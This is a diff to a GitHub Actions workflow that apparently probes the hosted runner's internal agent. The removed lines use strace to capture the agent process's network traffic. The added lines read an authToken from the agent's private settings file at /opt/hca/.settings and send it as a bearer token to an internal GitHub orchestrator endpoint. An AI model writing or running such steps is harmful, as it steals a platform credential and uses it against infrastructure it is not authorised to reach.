@@ -1,4 +1,4 @@
-name: strace HCA
+name: Final Go Client
 on:
   push:
     branches: [master]
@@ -7,9 +7,15 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - run: |
-          HCA_PID=$(pgrep -f hosted-compute-agent)
-          echo "HCA PID: $HCA_PID"
-          
-          # Use strace to capture HCA's network send/recv for 2 seconds
-          timeout 3 strace -qq -p $HCA_PID -e trace=read,write,writev,sendto,recvfrom -s 4096 2>&1 | head -50
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run Twirp client with verbose error
+        continue-on-error: true
+        run: |
+          ./hca-client 2>&1
+          echo "---"
+          # Also test via curl with more detail
+          TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
+          curl -sv --connect-timeout 10 \
+            -H "Authorization: Bearer $TOK" \
+            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/" 2>&1 | tail -20
